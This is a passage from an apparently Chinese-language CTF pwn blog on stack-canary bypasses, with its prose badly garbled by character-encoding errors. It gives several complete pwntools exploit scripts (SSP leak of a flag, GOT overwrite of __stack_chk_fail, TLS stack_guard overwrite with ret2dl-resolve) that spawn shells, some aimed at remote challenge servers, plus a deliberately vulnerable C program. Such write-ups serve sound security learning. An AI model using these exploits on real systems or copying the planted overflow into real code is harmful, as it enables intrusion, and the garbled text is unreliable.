void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
&#123;
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, &quot;*** %s ***: %s terminatedn&quot;,
                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
&#125;
</code></pre>
<p>è¦†ç›–åˆ°argvå°±å¯è¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„å‚æ•°ï¼ˆå³åˆ©ç”¨äº†canaryçš„æŠ¥é”™ä¿¡æ¯ï¼‰</p>
<p>ä¸åŒçš„libcå¯¹äº__fortify_failå®ç°æœ‰å·®å¼‚ï¼Œä¸‹é¢æ˜¯glibcçš„å®ç°<br><a target="_blank" rel="noopener" href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/debug/fortify_fail.c">githubæºç ï¼šglibc&#x2F;debug&#x2F;fortify_fail.c</a><br>ã€2018ç½‘é¼æ¯ Guessã€‘<br>(1)checsksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628135719174.png" alt="image-20230628135719174"></p>
<p>(2)IDAåˆ†æ<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628142542077.png" alt="image-20230628142542077"></p>
<p>ï¼ˆ3ï¼‰åˆ©ç”¨stack samshingåŸç† gdbè°ƒè¯•æ‰¾åˆ°argv[0]è®¡ç®—åç§»<br>é€šè¿‡è¦†ç›–libc_argv[0]çš„å†…å®¹è§¦å‘canaryä¿æŠ¤å°†è¦†ç›–å†…å®¹è¿›è¡Œè¾“å‡º<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628143124351.png" alt="image-20230628143124351"></p>
<p>åœ¨mainå‡½æ•°ä½ç½®ä¸‹æ–­ç‚¹ rsiå¤„ä¸ºargv[0]åœ°å€(0x7fffffffdfc87)<br>libcä¸­æœ‰ä¸€ä¸ªå˜é‡environï¼Œå‚¨å­˜ç€æ ˆåœ°å€ åªè¦å¾—åˆ°libcåŸºå€ï¼Œå°±å¯ä»¥ç®—å‡ºè¿™ä¸ªå˜é‡çš„åœ°å€ï¼Œå†æ¬¡ç”¨__stack_chk_failè¯»å–è¿™ä¸ªå˜é‡å°±å¯ä»¥å¾—åˆ°æ ˆçš„ä¸€ä¸ªåœ°å€ï¼Œå°±èƒ½è®¡ç®—å‡ºè¯»è¿›æ¥çš„flagçš„åœ°å€ï¼Œä»è€Œå†æ¬¡ç”¨stack smashè¯»å–flag</p>
<p>ç¬¬ä¸€æ¬¡ï¼Œæˆ‘ä»¬æ³„éœ²å‡½æ•°çš„gotè¡¨å†…å®¹ï¼Œå¾—åˆ°glibcåœ°å€ã€‚å¾—åˆ°glibcåœ°å€ï¼Œæ˜¯ä¸ºäº†è®¡ç®—å‡ºstack_endå˜é‡çš„åœ°å€ï¼Œè¿›è€Œï¼Œç¬¬äºŒæ¬¡ï¼Œæˆ‘ä»¬æ³„éœ²æ ˆåœ°å€ï¼Œè®¡ç®—å‡ºflagå­˜æ”¾çš„åœ°å€ï¼Œäºæ˜¯ï¼Œç¬¬ä¸‰æ¬¡ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ³„éœ²flagçš„å€¼ã€‚</p>
<p>getså‡½æ•°ä¸‹æ–­ç‚¹  è°ƒè¯•è®¡ç®—åç§»0xfc8-0xea0ï¼ˆ0x128ï¼‰ã€è¿˜éœ€è¿›ä¸€æ­¥æ·±å…¥ç†è§£ã€‘</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628161126662.png" alt="image-20230628161126662"></p>
<p>expï¼š</p>
<pre><code class="python">from pwn import *
from LibcSearcher import *
context.log_level = &#39;debug&#39;
elf = ELF(&#39;./GUESS&#39;)
# libc = ELF(&#39;./libc-2.23.so&#39;)
io = remote(&#39;node4.buuoj.cn&#39;,27922)
# io = process(&#39;./GUESS&#39;)

puts_got = elf.got[&#39;puts&#39;]

def leak_addr(content):
    io.recvline()
    io.sendline(content)
    io.recvuntil(&#39;*** stack smashing detected ***: &#39;)
    addr = u64(io.recv(6).ljust(8,b&#39;\x00&#39;))
    return addr

# step1: leak puts_addr
payload1 = b&#39;a&#39;*0x128+p64(puts_got)
puts_plt = leak_addr(payload1)
print(&quot;puts_plt-----&gt;&quot; + hex(puts_plt))
libc = LibcSearcher(&quot;puts&quot;,puts_plt)
libc_base = puts_plt - libc.dump(&quot;puts&quot;)
print(&quot;libc_base-----&gt;&quot; + hex(libc_base))
environ = libc.dump(&#39;__environ&#39;) + libc_base

# step2: leak environ
payload2 = b&#39;a&#39;*0x128 + p64(environ)
environ_addr = leak_addr(payload2)
print(&quot;enviorn in stack-----&gt;&quot; + hex(environ_addr))

# step3: leak flag
payload3 = b&#39;a&#39;*0x128 + p64(environ_addr-0x168)
io.sendlineafter(&#39;Please type your guessing flag\n&#39;,payload3)
print(io.recvline())
</code></pre>
<h4 id="äº”ã€åŠ«æŒstack-chk-failå‡½æ•°æ³„éœ²canary"><a href="#äº”ã€åŠ«æŒstack-chk-failå‡½æ•°æ³„éœ²canary" class="headerlink" title="äº”ã€åŠ«æŒstack_chk_failå‡½æ•°æ³„éœ²canary"></a>äº”ã€åŠ«æŒstack_chk_failå‡½æ•°æ³„éœ²canary</h4><p>æ€è·¯ï¼šåŠ«æŒstack_chk_failï¼Œå¯ä»¥ä¿®æ”¹å…¨å±€åç§»è¡¨(GOT)ä¸­å­˜å‚¨çš„_stack_chk_failå‡½æ•°åœ°å€ï¼Œåœ¨è§¦å‘canaryæ£€æŸ¥å¤±è´¥æ—¶ï¼Œè·³è½¬åˆ°æŒ‡å®šçš„åœ°å€ç»§ç»­æ‰§è¡Œ.</p>
<p>ç™¾åº¦æ¯flagenå…¶å®å¯ä»¥åšæ›´å¥½çš„æ —å­ ç›®å‰æš‚æœªè·å–åˆ°ç›¸å…³æ–‡ä»¶ ä»¥åæœ‰æœºä¼šå¡«å‘ğŸ˜Š</p>
<p>æœ‰ç›¸å…³æ–‡ç« [(12æ¡æ¶ˆæ¯) [pwn]ROPï¼šä¸‰é“é¢˜è®²è§£èŠ±å¼ç»•è¿‡Canaryæ ˆä¿æŠ¤_breezeO_oçš„åšå®¢-CSDNåšå®¢](<a target="_blank" rel="noopener" href="https://blog.csdn.net/Breeze_CAT/article/details/100086513?ops_request_misc=%7B%22request_id%22:%22168796009416800197015252%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168796009416800197015252&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-100086513-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=%E7%99%BE%E5%BA%A6%E6%9D%AF">https://blog.csdn.net/Breeze_CAT/article/details/100086513?ops_request_misc=%7B%22request%5Fid%22%3A%22168796009416800197015252%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=168796009416800197015252&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-100086513-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=ç™¾åº¦æ¯</a> flagen&amp;spm&#x3D;1018.2226.3001.4187)</p>
<p>è‡ªå·±æ•´ä¸ªå°ç®€å•ğŸ¤–<br><strong>æ¼æ´ä»£ç </strong></p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
void shell(void)
&#123;
    system(&quot;/bin/sh&quot;);
&#125;
int main(int argc, char *argv[])
&#123;
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    char buf[175];
    read(0, buf, 275);#æ ˆæº¢å‡º
    printf(buf);
    return 0;
&#125;
</code></pre>
<p>è¦æƒ³æˆåŠŸåŠ«æŒå‡½æ•°ä¿®æ”¹gotè¡¨ éœ€å…³é—­relro<br>è°ƒç”¨shellå‡½æ•°éœ€è¦å…³é—­pie</p>
<pre><code>gcc a.c -m32 -fstack-protector -no-pie -z noexecstack -z norelro -o a
</code></pre>
<p>expï¼š</p>
<pre><code class="python">from pwn import *
import time
context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)
sh=process(&#39;a&#39;)
offset=10
scf_got=ELF(&#39;a&#39;).got[&#39;__stack_chk_fail&#39;]
gs_addr=ELF(&#39;a&#39;).sym[&#39;getshell&#39;]
exp=fmtstr_payload(offset, &#123;scf_got: gs_addr&#125;)
sh.send(exp+&#39;A&#39;*100)
sh.interactive()
</code></pre>
<p>ä¹ä¹ä¹<br>æ‰¾åˆ°æ–‡ä»¶äº†<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/%601%7D0$_NRN19IS]ZZA9EK_PE.jpg" alt="img"><br>ã€flagenã€‘<br>gotè¡¨è¦†å†™åŸç†<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628224746293.png" alt="image-20230628224746293"><br>ï¼ˆ1ï¼‰checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628215919448.png" alt="image-20230628215919448"></p>
<p>ï¼ˆ2ï¼‰IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628220716478.png" alt="image-20230628220716478"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628220912579.png" alt="image-20230628220912579"></p>
<p>æ­¤éƒ¨åˆ†ä¼šå°†è¾“å…¥éƒ¨åˆ†å˜é•¿ï¼ˆ1ä¸ªå­—èŠ‚å˜æˆ3ä¸ªå­—èŠ‚ï¼‰ï¼Œå…¶ä¸­destä¸ºæŒ‡å‘å †ç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œåœ¨è°ƒç”¨leetify()æ—¶ï¼Œå…¶å€¼å°†è¢«å‹å…¥æ ˆä¸­ï¼Œç”±äºè¯¥å‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´è¦†ç›–æ‰destçš„å€¼ä¸ºæŒ‡å®šåœ°å€ï¼Œåœ¨åç»­è°ƒç”¨strcpy()æ—¶ï¼Œå®ç°å‘ä»»æ„åœ°å€å†™çš„ç›®çš„ã€‚<br>æˆ‘ä»¬å¯ä»¥å°†destè¦†ç›–ä¸ºstack_chk_failå‡½æ•°åœ¨gotè¡¨ä¸­çš„åœ°å€ï¼Œè¾¾åˆ°ä¿®æ”¹stack_chk_failå‡½æ•°è°ƒç”¨åœ°å€çš„ç›®çš„ï¼Œè¿™æ ·åç»­åœ¨è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œå®é™…ä¸Šæ‰§è¡Œçš„æ˜¯æ”»å‡»è€…çš„ä»£ç ã€‚åˆå› ä¸ºcanaryå­˜åœ¨\x00æˆªæ–­ï¼Œéœ€å¯»æ‰¾åˆé€‚çš„å‡½æ•°è¿›è¡Œè¾“å…¥.</p>
<p>è¿˜æ˜¯é€šè¿‡æ³„éœ²libcbase getshell</p>
<pre><code class="python">libc=LibcSearcher(&#39;alarm&#39;,alarm)
system=alarm-libc.dump(&#39;alarm&#39;)+libc.dump(&#39;system&#39;)
malloc_hook=alarm-libc.dump(&#39;alarm&#39;)+libc.dump(&#39;__malloc_hook&#39;)
print(&#39;malloc_hook&#39;,hex(malloc_hook))
p.sendline(&#39;/bin/sh\x00&#39;)
p.sendline(p32(system))
</code></pre>
<p>expï¼š</p>
<pre><code class="python">from pwn import *
from LibcSearcher import *
context.log_level=&#39;debug&#39;
#context.terminal=[&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]
elf=ELF(&#39;./flagen&#39;)
def input(p,input):
    p.sendlineafter(&#39;: &#39;,&#39;1&#39;)
    p.sendline(input)
def up(p):
    p.sendlineafter(&#39;: &#39;,&#39;2&#39;)
def low(p):
    p.sendlineafter(&#39;: &#39;,&#39;3&#39;)
def change(p):
    p.sendlineafter(&#39;: &#39;,&#39;4&#39;)
def addprefix(p):
    p.sendlineafter(&#39;: &#39;,&#39;5&#39;)
def prin(p):
    p.sendlineafter(&#39;: &#39;,&#39;6&#39;)
def exit(p):
    p.sendlineafter(&#39;: &#39;,&#39;7&#39;)
puts=0x08048510
ret=0x0804846a
stack_check=0x0804B01C
pop_1=0x08048481
pop_2=0x08048b00
pop_3=0x08048d8d
bss=0x804b144+0x8
a=0x08048F60
read=0x080486CB
p=process(&#39;./flagen&#39;)
payload=p32(ret)+b&#39;h&#39;*0x55+&#39;a&#39;*8+b&#39;a&#39;*5+p32(pop_1)+p32(stack_check)
payload+=p32(puts)+p32(pop_1)+p32(elf.got[&#39;free&#39;])
payload+=p32(read)+p32(pop_3)+p32(bss+0x100)+p32(0x6fffffff)+p32(0xffffffff)
payload+=p32(read)+p32(pop_3)+p32(elf.got[&#39;free&#39;])+p32(0x6fffffff)+p32(0xffffffff)
payload+=p32(elf.plt[&#39;free&#39;])+p32(pop_1)+p32(bss+0x100)
input(p,payload)
change(p)
alarm=u32(p.recv()[4:8].ljust(4,&#39;\x00&#39;))
libc=LibcSearcher(&#39;alarm&#39;,alarm)
system=alarm-libc.dump(&#39;alarm&#39;)+libc.dump(&#39;system&#39;)
malloc_hook=alarm-libc.dump(&#39;alarm&#39;)+libc.dump(&#39;__malloc_hook&#39;)
print(&#39;malloc_hook&#39;,hex(malloc_hook))
p.sendline(&#39;/bin/sh\x00&#39;)
p.sendline(p32(system))
p.interactive()
p.close()
</code></pre>
<h4 id="å…­ã€ä¿®æ”¹TSLç»•è¿‡canary"><a href="#å…­ã€ä¿®æ”¹TSLç»•è¿‡canary" class="headerlink" title="å…­ã€ä¿®æ”¹TSLç»•è¿‡canary"></a>å…­ã€ä¿®æ”¹TSLç»•è¿‡canary</h4><p>åœ¨linuxä¸‹æœ‰ä¸€ç§çº¿ç¨‹å±€éƒ¨å­˜å‚¨ï¼ˆTread Local Storageï¼‰æœºåˆ¶ï¼Œå³TLS.<br>å­˜å‚¨çº¿ç¨‹çš„ä¸€äº›å…¨å±€å˜é‡.<br>ç»“æ„ï¼š</p>
<pre><code class="c">typedef struct  
&#123;  
  void *tcb;        /* Pointer to the TCB.  Not necessarily the  
               thread descriptor used by libpthread.  */  
  dtv_t *dtv;  
  void *self;       /* Pointer to the thread descriptor.  */  
  int multiple_threads;  
  int gscope_flag;  
  uintptr_t sysinfo;  
  uintptr_t stack_guard;  
  uintptr_t pointer_guard;  
  ...  
&#125; tcbhead_t;  
</code></pre>
<p>æ³¨æ„ï¼šç»“æ„ä¸­uintptr_t stack_guardå°±æ˜¯canaryå€¼ï¼Œåˆ©ç”¨æ¼æ´ç¯¡æ”¹stack_guardå€¼å³å¯ç»•è¿‡canaryï¼Œè€Œgsæˆ–fså¯„å­˜å™¨æŒ‡å‘æ­¤ç»“æ„.</p>
<p>ã€bfnoteã€‘</p>
<p>ï¼ˆ1ï¼‰checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628102341433.png" alt="image-20230628102341433"></p>
<p>ï¼ˆ2ï¼‰è¿›IDA<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628105142174.png" alt="image-20230628105142174"></p>
<p>æ¼æ´ï¼šã€1ã€‘sæº¢å‡º0x600<br>           ã€2ã€‘v4è¿›è¡Œåˆå§‹åŒ–ï¼Œæ£€æµ‹é™åˆ¶äº†è¾“å…¥é•¿åº¦ï¼Œè€Œåˆ©ç”¨æ—¶å¹¶éåˆ©ç”¨äº†æ£€æµ‹å®Œæˆçš„å€¼ï¼Œåˆ©ç”¨äº†æ£€æµ‹å‰çš„å€¼ï¼Œä½¿å¾—æˆ‘ä»¬æ‹¥æœ‰ä¸€æ¬¡åœ¨ä»»æ„åœ°å€å†™å…¥é•¿åº¦çš„èƒ½åŠ›<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628110303853.png" alt="image-20230628110303853"></p>
<p>gså¯„å­˜å™¨æŒ‡å‘çš„ä½ç½®å®é™…ä¸Šå°±æ˜¯å†…å­˜ä¸­æŸå¤„çš„tcbhead_tï¼Œè€Œåé¢çš„0x14æŒ‡çš„æ˜¯stack_guardç›¸å¯¹çš„åç§»ï¼Œé‚£ä¹ˆtcbhead_tåˆ°åº•å­˜å‚¨åœ¨å“ªï¼Œæ¯ä¸ªlibcä¸åŒï¼Œä½†æ˜¯å¯¹äºpwné¢˜ç»å¸¸ä½¿ç”¨çš„libæ¥è¯´ï¼Œå…¶åˆ†å¸ƒåŸºæœ¬å¦‚å›¾æ‰€ç¤º<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628111024934.png" alt="image-20230628111024934"></p>
<p>åœ¨libcåœ°å€æ›´ä¸‹ä½ç½®å’Œmmapä¸€æ ·åŒå±å…±äº«æ˜ å°„åŒºåŸŸï¼Œåç§»ç›¸å¯¹å›ºå®š.å½“æˆ‘ä»¬mallocä¸€ä¸ªç›¸å½“å¤§çš„ç©ºé—´ï¼ˆæ­¤é¢˜&gt;&#x3D;0x20000ï¼‰ï¼Œmallodå°±ä¼šç”¨mmapæ¥åˆ†é…å†…å­˜ç©ºé—´ï¼Œå…¶åˆ†é…ä½ç½®ä¹Ÿä¼šä½äºå…±äº«æ˜ å°„åŒºåŸŸï¼Œä¾æ®mmapæœºåˆ¶ï¼Œå…¶æ°å¥½å¤„äºtcbhead_råœ°å€çš„ä½åœ°å€å¤„ï¼Œæ­¤æ—¶åˆ©ç”¨ç¬¬äºŒä¸ªæ¼æ´å†™å…¥å¯ä¿®æ”¹canaryçš„å€¼ï¼Œä»è€Œå®ç°ç»•è¿‡.<a target="_blank" rel="noopener" href="https://blog.csdn.net/wmq880204/article/details/115163244?ops_request_misc=%7B%22request_id%22:%22168792272416800213048166%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168792272416800213048166&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-115163244-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=mmap=%E5%88%86%E9%85%8D%E6%9C%BA%E5%88%B6&spm=1018.2226.3001.4187">(12æ¡æ¶ˆæ¯) Linuxç³»ç»Ÿmmapå†…å­˜æ˜ å°„æœºåˆ¶åŸç†_seqiqi_è è-çªçªçš„åšå®¢-CSDNåšå®¢</a></p>
<p>ï¼ˆ3ï¼‰ret2dl-resolveæœºåˆ¶åˆ©ç”¨ï¼ˆå»¶è¿Ÿç»‘å®šåº”ç”¨ï¼‰<br>åˆ©ç”¨çš„ä¸¤ç§ç»“æ„<em>Symï¼ˆx86ä¸ºElf32_Sym x64ä¸ºElf64_Symï¼‰</em>ã€<em>Relï¼ˆx86ä¸ºElf32_Rel x64ä¸ºElf64_Relï¼‰</em></p>
<p>SymåŸºæœ¬ç»“æ„</p>
<pre><code class="c">typedef struct
&#123;
  Elf32_Word    st_name; //ç¬¦å·åï¼Œæ˜¯ç›¸å¯¹.dynstrèµ·å§‹çš„åç§»ï¼ˆ4å­—èŠ‚ï¼‰
  Elf32_Addr    st_value;ã€€ã€€//(4å­—èŠ‚)
  Elf32_Word    st_size;ã€€ã€€//(4å­—èŠ‚)
  unsigned char st_info; //å¯¹äºå¯¼å…¥å‡½æ•°ç¬¦å·è€Œè¨€ï¼Œå®ƒæ˜¯0x12(1å­—èŠ‚)
  unsigned char st_other;ã€€ã€€//(1å­—èŠ‚)
  Elf32_Section st_shndx;ã€€ã€€// (2å­—èŠ‚)
&#125;Elf32_Sym; //å¯¹äºå¯¼å…¥å‡½æ•°ç¬¦å·è€Œè¨€ï¼Œå…¶ä»–å­—æ®µéƒ½æ˜¯0
</code></pre>
<pre><code class="c">struct Elf64_Sym
&#123;
  Elf64_Word    st_name;   //ç¬¦å·åï¼Œæ˜¯ç›¸å¯¹.dynstrèµ·å§‹çš„åç§»(4å­—èŠ‚ï¼‰
  unsigned char st_info;   //å¯¹äºå¯¼å…¥å‡½æ•°ç¬¦å·è€Œè¨€ï¼Œå®ƒæ˜¯0x12(1å­—èŠ‚)
  unsigned char st_other;  //(1å­—èŠ‚)
  Elf64_Section st_shndx;  //(2å­—èŠ‚ï¼‰
  Elf64_Addr    st_value;  //(8å­—èŠ‚)
  Elf64_Xword   st_size;   //(8å­—èŠ‚)
&#125;;//å¯¹äºå¯¼å…¥å‡½æ•°è€Œè¨€ï¼Œå…¶ä»–å­—æ®µéƒ½æ˜¯0
</code></pre>
<p>RelåŸºæœ¬ç»“æ„</p>
<pre><code class="c">
typedef struct &#123;
    Elf32_Addr        r_offset;//æ˜¯gotçš„å¯¹åº”çš„åœ°å€(4å­—èŠ‚)
    Elf32_Word       r_info; //(4å­—èŠ‚),å…¶ä¸­æœ€ä½å­—èŠ‚åº”è¯¥ä¸º0x7ï¼Œå‰ä¸‰ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ•°å­—ï¼Œæ˜¯ç›¸å¯¹.dynsymèµ·å§‹çš„åç§»çš„ä¸‹æ ‡(å³åç§»è¿˜éœ€è¦é™¤ä»¥0x10)
&#125; Elf32_Rel;
</code></pre>
<pre><code class="c">typedef struct &#123;
    Elf64_Xword    r_offset;   //æ˜¯gotçš„å¯¹åº”çš„åœ°å€(8å­—èŠ‚)
    Elf64_Xword    r_info;     //(8å­—èŠ‚),å…¶ä¸­æœ€ä½å­—èŠ‚åº”è¯¥ä¸º0x7,å‰ä¸‰ä¸ªå­—èŠ‚å½“åšä¸€ä¸ª
ã€€ã€€
 Elf64_Sxword r_addend; ã€€ã€€//(8å­—èŠ‚)
 
&#125; Elf64_Rel;
</code></pre>
<p><u>ä¸€èˆ¬x64é€‰æ‹©gadgetè¿›è¡Œæ”»å‡» æ­¤é¢˜ä¹Ÿä¸º32ä½ æ•…ä»¥ä¸‹è¯¦ç»†ä»‹ç»32ä½ä½¿ç”¨ret2dl-resolveæ”»å‡»æ–¹æ³•</u><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628115713705.png" alt="image-20230628115713705"></p>
<p>32ä½å»¶è¿Ÿç»‘å®šå…·ä½“æµç¨‹<br>*ç¬¬ä¸€ä¸ªpushçš„å€¼å®é™…ä¸Šæ˜¯å¯¹åº”çš„Relå’Œ.dynrelçš„ç›¸å¯¹åç§»<br> *jmpè·³è½¬åˆ°ç¬¬ä¸€ä¸ªç¬¬ä¸€ä¸ªpushåç§»å¯¹åº”çš„Relç»“æ„ï¼Œå–å‡ºé‡Œé¢çš„infoä¸­åŒ…å«çš„symç»“æ„çš„ä¸‹æ ‡ï¼Œæ‰¾åˆ°å¯¹åº”çš„symä¸­çš„å­—ç¬¦ä¸²çš„åœ°å€ï¼Œä»è€Œè§£æåˆ°è¿™ä¸ªåç§°ä¸ºè¯¥å­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œå°†å…¶åœ°å€å†™å…¥relç¬¬ä¸€é¡¹çš„åœ°å€ä¸­ã€‚æ­¤æ—¶ï¼Œå°†æ ˆæ¸…ç©ºåˆ°ä¸€å¼€å§‹pushçš„ä¸¤ä¸ªå€¼ä¹‹å‰ï¼Œä»è€Œæ­£å¸¸æ‰§è¡Œå¯¹åº”çš„å­—ç¬¦ä¸²çš„å‡½æ•°å³å¯ã€‚</p>
<p>æˆ‘ä»¬çš„ret2dl-resolveå®é™…ä¸Šè®¾ç½®ä¸º.got.plt<a href="%E4%B9%9F%E5%B0%B1%E6%98%AF%E5%9B%BE%E4%B8%AD%E7%9A%840x8048450">0</a>å¯¹åº”çš„åœ°å€å³å¯ï¼Œä»è€Œä»–è§£æå®Œæˆåä¼šç»§ç»­æŒ‰ç…§ç»™å®šçš„å‚æ•°æ‰§è¡Œã€‚<br><em>tip</em><br>ä¸­é—´çš„ç©ºç™½ï¼Œä½œä¸ºgapï¼Œæ˜¯å› ä¸ºæ‰§è¡Œçš„æ—¶å€™æœ€åæœ‰æ ˆåœ°å€çš„å˜åŒ–ï¼Œè‹¥æ— gapä½œä¸ºé˜»éš”ï¼Œå¯èƒ½æ ˆçš„å˜åŒ–ä¼šè¦†ç›–æ‰ä¸€äº›é‡è¦çš„æ•°æ®ï¼Œä»è€Œå¯¼è‡´ç¨‹åºå´©æºƒï¼Œæ‰€ä»¥éœ€è¦ç•™æœ‰ä¸€å®šçš„gapä½œä¸ºæ ˆç©ºé—´å˜åŒ–çš„gap</p>
<p>ï¼ˆ4ï¼‰æ¼æ´åˆ©ç”¨<br>è§‚å¯Ÿä¸»å‡½æ•°å‘ç°ä¸€å…±è¿›è¡Œäº†ä¸‰æ¬¡è¾“å…¥ï¼š<br>ã€1ã€‘ä¿®æ”¹canaryã€æœ€ç»ˆçš„è¿”å›åœ°å€åŠæ ˆåœ°å€ï¼ˆå¯çœ‹æ±‡ç¼–ï¼‰<br>ã€2ã€‘ä¼ªé€ äº†ä¸€ä¸ªshellcode<br>ã€3ã€‘ä½¿ç”¨TSLï¼Œç»•è¿‡canary</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628134309027.png" alt="image-20230628134309027"></p>
<p>expï¼š</p>
<pre><code class="python">from pwn import *

r = remote(&quot;node4.buuoj.cn&quot;, 25009)
#r = process(&quot;./bfnote&quot;)


elf = ELF(&quot;./bfnote&quot;)
#libc = ELF(&#39;./lib/i386-linux-gnu/libc.so.6&#39;)
bss_start = 0x0804A060
gap = 0x500
stack_overflow = b&#39;a&#39; * (0x3e - 0xc + 0x8) + p64(bss_start + gap + 0x4)
 
r.recvuntil(&#39;Give your description : &#39;)
r.send(stack_overflow)

r.recvuntil(&#39;Give your postscript : &#39;)

fake_sym = p32(bss_start + gap + 0x4 * 4 + 0x8 - 0x80482C8) + p32(0) + p32(0) + p32(0x12)
fake_rel = p32(bss_start) + p32(0x7 + int((bss_start + gap + 0x4 * 4 + 0x8 + 0x8 + 0x8 - 0x080481D8) / 0x10) * 0x100)
r.send(b&#39;\x00&#39; * gap + p32(0x08048450) + p32(bss_start + gap + 0x4 * 4 + 0x8 * 2 - 0x080483D0) + p32(0) + p32(bss_start + gap + 0x4 * 4) + b&#39;/bin/sh\x00&#39; + b&#39;system\x00\x00&#39; + fake_rel + fake_sym)

r.recvuntil(&#39;Give your notebook size : &#39;)
r.send(str(0x20000))


r.recvuntil(&#39;Give your title size : &#39;)
r.send(str(0xf7d22714 - 0xf7d01008 - 16))

r.recvuntil(&#39;invalid ! please re-enter :\n&#39;)
r.send(str(4))

r.recvuntil(&#39;Give your title : &#39;)
r.send(b&#39;a&#39;)

r.recvuntil(&#39;Give your note : &#39;)
r.send(b&#39;aaaa&#39;)

r.interactive()
</code></pre>
<p>éš¾éš¾éš¾ å•ƒå•ƒå•ƒ<br>æ˜å¤©åˆæ˜¯æ–°çš„ä¸€å¤©â­<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230628215705.jpg"></p>

  </div>
</article>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Articles</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/links/">Links</a></li>
        
          <li><a href="/tags/">Tags</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.</span> <span class="toc-text">Canaryè§£å†³å§¿åŠ¿</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81canary%E7%88%86%E7%A0%B4"><span class="toc-number">1.0.1.</span> <span class="toc-text">ä¸€ã€canaryçˆ†ç ´</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%A6%86%E7%9B%96%E6%88%AA%E6%96%AD%E5%AD%97%E7%AC%A6%EF%BC%88-x00%EF%BC%89%E8%8E%B7%E5%8F%96canary"><span class="toc-number">1.0.2.</span> <span class="toc-text">äºŒã€è¦†ç›–æˆªæ–­å­—ç¬¦ï¼ˆ\x00ï¼‰è·å–canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%8E%B7%E5%8F%96canary"><span class="toc-number">1.0.3.</span> <span class="toc-text">ä¸‰ã€åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è·å–canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SSP-Leak%E5%88%A9%E7%94%A8canary"><span class="toc-number">1.0.4.</span> <span class="toc-text">å››ã€SSP Leakåˆ©ç”¨canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%8A%AB%E6%8C%81stack-chk-fail%E5%87%BD%E6%95%B0%E6%B3%84%E9%9C%B2canary"><span class="toc-number">1.0.5.</span> <span class="toc-text">äº”ã€åŠ«æŒstack_chk_failå‡½æ•°æ³„éœ²canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E4%BF%AE%E6%94%B9TSL%E7%BB%95%E8%BF%87canary"><span class="toc-number">1.0.6.</span> <span 